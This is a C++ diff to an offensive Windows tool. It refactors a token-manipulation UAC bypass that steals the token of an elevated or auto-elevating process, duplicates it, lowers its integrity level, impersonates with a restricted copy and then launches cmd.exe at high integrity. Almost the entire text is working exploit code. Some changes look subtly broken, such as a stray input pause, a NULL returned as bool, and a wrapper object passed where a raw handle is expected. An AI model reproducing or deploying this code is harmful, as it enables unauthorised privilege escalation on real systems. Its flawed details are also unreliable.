@@ -14,18 +14,20 @@ bool token_manipulation::run()
 	std::cout << "[+] Token Manipulation" << std::endl;
 
 	// FIRST WE SEARCH FOR ANY RUNNING ELEVATED APP IN SAME SECTION
-	HANDLE process_handle = token_manipulation::find_elevated_process();
-
+	safe_handle process_handle;
+	
 	auto created_process = false;
-	if (process_handle == NULL) // NO ELEVATED PROCESSES FOUND - TRIGGER ALWAYS_NOTIFY :'(
-		created_process = token_manipulation::launch_auto_elevating_app(&process_handle);
+	if (!token_manipulation::find_elevated_process(process_handle)) // NO ELEVATED PROCESSES FOUND - TRIGGER ALWAYS_NOTIFY :'(
+		created_process = token_manipulation::launch_auto_elevating_app(process_handle);
 
-	std::cout << "[+] Process Handle: " << std::hex << reinterpret_cast<uint32_t>(process_handle) << std::dec << std::endl;
-	std::cout << "[+] Process Id: " << GetProcessId(process_handle) << std::endl;
+	std::cout << "[+] Process Handle: " << std::hex << reinterpret_cast<uint32_t>(process_handle.get_handle()) << std::dec << std::endl;
+	std::cout << "[+] Process Id: " << GetProcessId(process_handle.get_handle()) << std::endl;
 
 	// OPEN ELEVATED PROCESS' TOKEN
-	HANDLE token_handle;
-	auto status = ntdll::NtOpenProcessToken(process_handle, MAXIMUM_ALLOWED, &token_handle);
+	HANDLE temp_token_handle;
+	auto status = ntdll::NtOpenProcessToken(process_handle.get_handle(), MAXIMUM_ALLOWED, &temp_token_handle);
+
+	auto token_handle = safe_handle(temp_token_handle);
 
 	if (!NT_SUCCESS(status))
 	{
@@ -33,15 +35,13 @@ bool token_manipulation::run()
 		return false;
 	}
 
-	std::cout << "[+] Token Handle: " << std::hex << reinterpret_cast<uint32_t>(token_handle) << std::dec << std::endl;
+	std::cout << "[+] Token Handle: " << std::hex << reinterpret_cast<uint32_t>(token_handle.get_handle()) << std::dec << std::endl;
 
 	// DUPLICATE TOKEN WITH TOKEN_ALL_ACCESS
-	auto dup_token_handle = duplicate_token(token_handle, TOKEN_ALL_ACCESS, TokenPrimary);
+	safe_handle dup_token_handle;
+	duplicate_token(token_handle, TOKEN_ALL_ACCESS, TokenPrimary, dup_token_handle);
 
-	// CLOSE PREVIOUS, SHITTY HANDLE
-	CloseHandle(token_handle); 
-
-	std::cout << "[+] Duplicated Token Handle: " << std::hex << reinterpret_cast<uint32_t>(dup_token_handle) << std::dec << std::endl;
+	std::cout << "[+] Duplicated Token Handle: " << std::hex << reinterpret_cast<uint32_t>(dup_token_handle.get_handle()) << std::dec << std::endl;
 
 	// LOWER TOKEN IL FROM HIGH -> MEDIUM
 	if (!token_manipulation::lower_token_il(dup_token_handle))
@@ -51,10 +51,8 @@ bool token_manipulation::run()
 	}
 
 	// CREATE RESTRICTED TOKEN
-	auto restricted_token_handle = token_manipulation::create_restricted_token(dup_token_handle);
-
-	// CLOSE DUPLICATED TOKEN HANDLE, WE WON'T NEED IT ANYMORE
-	CloseHandle(dup_token_handle);
+	safe_handle restricted_token_handle;
+	token_manipulation::create_restricted_token(dup_token_handle, restricted_token_handle);
 
 	// IMPERSONATE USING RESTRICTED TOKEN
 	if (!token_manipulation::impersonate_user(restricted_token_handle))
@@ -62,9 +60,6 @@ bool token_manipulation::run()
 		std::cout << "[!] impersonate_user failed" << std::endl;
 		return false;
 	}
-
-	// CLOSE RESTRICTED TOKEN HANDLE, WE WON'T NEED IT ANYMORE
-	CloseHandle(restricted_token_handle);
 
 	// LAUNCH PAYLOAD WITH HIGH IL, BYPASSING UAC
 	if (!token_manipulation::launch_payload())
@@ -82,15 +77,12 @@ bool token_manipulation::run()
 
 	// IF CREATED, TERMINATE AUTO-ELEVATING PROCESS
 	if (created_process)
-		TerminateProcess(process_handle, 1);
-
-	// CLOSE PROCESS HANDLE
-	CloseHandle(process_handle);
+		TerminateProcess(process_handle.get_handle(), 1);
 
 	return true;
 }
 
-HANDLE token_manipulation::find_elevated_process()
+bool token_manipulation::find_elevated_process(safe_handle& process_handle)
 {
 	// ENUMERATE PROCESSES TO FIND AN ALREADY ELEVATED PROCESS
 	// TO STEAL ITS TOKEN
@@ -104,16 +96,19 @@ HANDLE token_manipulation::find_elevated_process()
 			auto handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, process_list[index]);
 
 			if (token_manipulation::is_process_admin(handle))
-				return handle;
+			{
+				std::cin.get();
+				process_handle.set_handle(handle);
+				return true;
+			}
 
 			CloseHandle(handle);
-
 		}
 	}
 
 	return NULL;
 }
-HANDLE token_manipulation::duplicate_token(HANDLE token_handle, ACCESS_MASK desired_access, _TOKEN_TYPE token_type)
+bool token_manipulation::duplicate_token(safe_handle& token_handle, ACCESS_MASK desired_access, _TOKEN_TYPE token_type, safe_handle& duplicated_token)
 {
 	SECURITY_QUALITY_OF_SERVICE sqos;
 	OBJECT_ATTRIBUTES obja;
@@ -125,32 +120,37 @@ HANDLE token_manipulation::duplicate_token(HANDLE token_handle, ACCESS_MASK desi
 	InitializeObjectAttributes(&obja, NULL, NULL, NULL, NULL);
 	obja.SecurityQualityOfService = &sqos;
 
-	auto status = ntdll::NtDuplicateToken(token_handle, desired_access, &obja, false, token_type, &dup_token_handle);
-	return dup_token_handle;
+	auto status = ntdll::NtDuplicateToken(token_handle.get_handle(), desired_access, &obja, false, token_type, &dup_token_handle);
+
+	duplicated_token.set_handle(dup_token_handle);
+
+	return NT_SUCCESS(status);
 }
-HANDLE token_manipulation::create_restricted_token(HANDLE token_handle)
+bool token_manipulation::create_restricted_token(safe_handle& token_handle, safe_handle& restricted_token)
 {
 	HANDLE restricted_token_handle;
 
-	ntdll::NtFilterToken(token_handle, LUA_TOKEN, NULL, NULL, NULL, &restricted_token_handle);
+	auto status = ntdll::NtFilterToken(token_handle.get_handle(), LUA_TOKEN, NULL, NULL, NULL, &restricted_token_handle);
 
-	return restricted_token_handle;
+	restricted_token.set_handle(restricted_token_handle);
+
+	return NT_SUCCESS(status);
 }
 
 bool token_manipulation::is_process_admin(HANDLE process)
 {
-	HANDLE token_handle;
-	OpenProcessToken(process, TOKEN_READ, &token_handle);
+	HANDLE temp_token_handle;
+	OpenProcessToken(process, TOKEN_READ, &temp_token_handle);
+
+	auto token_handle = safe_handle(temp_token_handle);
 
 	_TOKEN_ELEVATION_TYPE result;
 	DWORD bytes_read;
-	GetTokenInformation(token_handle, TokenElevationType, &result, sizeof(_TOKEN_ELEVATION_TYPE), &bytes_read);
-
-	CloseHandle(token_handle);
+	GetTokenInformation(token_handle.get_handle(), TokenElevationType, &result, sizeof(_TOKEN_ELEVATION_TYPE), &bytes_read);
 
 	return result == TokenElevationTypeFull;
 }
-bool token_manipulation::lower_token_il(HANDLE token_handle)
+bool token_manipulation::lower_token_il(safe_handle& token_handle)
 {
 	SID_IDENTIFIER_AUTHORITY authority = SECURITY_MANDATORY_LABEL_AUTHORITY;
 	PSID integrity_sid = nullptr;
@@ -167,12 +167,12 @@ bool token_manipulation::lower_token_il(HANDLE token_handle)
 	token_label.Label.Attributes = SE_GROUP_INTEGRITY;
 	token_label.Label.Sid = integrity_sid;
 
-	status = ntdll::NtSetInformationToken(token_handle, TokenIntegrityLevel, &token_label,
+	status = ntdll::NtSetInformationToken(token_handle.get_handle(), TokenIntegrityLevel, &token_label,
 		static_cast<ULONG>((sizeof(TOKEN_MANDATORY_LABEL) + ntdll::RtlLengthSid(integrity_sid))));
 
 	return NT_SUCCESS(status);
 }
-bool token_manipulation::launch_auto_elevating_app(HANDLE* process_handle)
+bool token_manipulation::launch_auto_elevating_app(safe_handle& process_handle)
 {
 	// RUN ELEVATED APP
 	SHELLEXECUTEINFOW shinfo;
@@ -187,24 +187,27 @@ bool token_manipulation::launch_auto_elevating_app(HANDLE* process_handle)
 		std::cout << "[!] ShellExecuteEx failed" << std::endl;
 		return false;
 	}
-	*process_handle = shinfo.hProcess;
+
+	process_handle.set_handle(shinfo.hProcess);
 
 	return true;
 }
-bool token_manipulation::impersonate_user(HANDLE token_handle)
+bool token_manipulation::impersonate_user(safe_handle& token_handle)
 {
-	auto imp_token_handle = token_manipulation::duplicate_token(token_handle, TOKEN_IMPERSONATE | TOKEN_QUERY, TokenImpersonation);
-
-	if (imp_token_handle == NULL)
+	safe_handle imp_token_handle;
+	if (!token_manipulation::duplicate_token(token_handle, TOKEN_IMPERSONATE | TOKEN_QUERY, TokenImpersonation, imp_token_handle))
 		return false;
 
-	ntdll::NtSetInformationThread(
+	if (imp_token_handle.get_handle() == NULL)
+		return false;
+
+	auto status = ntdll::NtSetInformationThread(
 		CurrentThread,
 		static_cast<THREADINFOCLASS>(5), //ThreadImpersonationToken
 		&imp_token_handle,
 		sizeof(HANDLE));
 
-	return imp_token_handle;
+	return NT_SUCCESS(status);
 }
 bool token_manipulation::revert_impersonation()
 {
@@ -233,6 +236,8 @@ bool token_manipulation::launch_payload()
 		L"C:\\Windows\\System32\\cmd.exe",
 		NULL, 0, NULL, nullptr,
 		&si, &pi);
+
+	CloseHandle(pi.hProcess);
 
 	return result;
 }
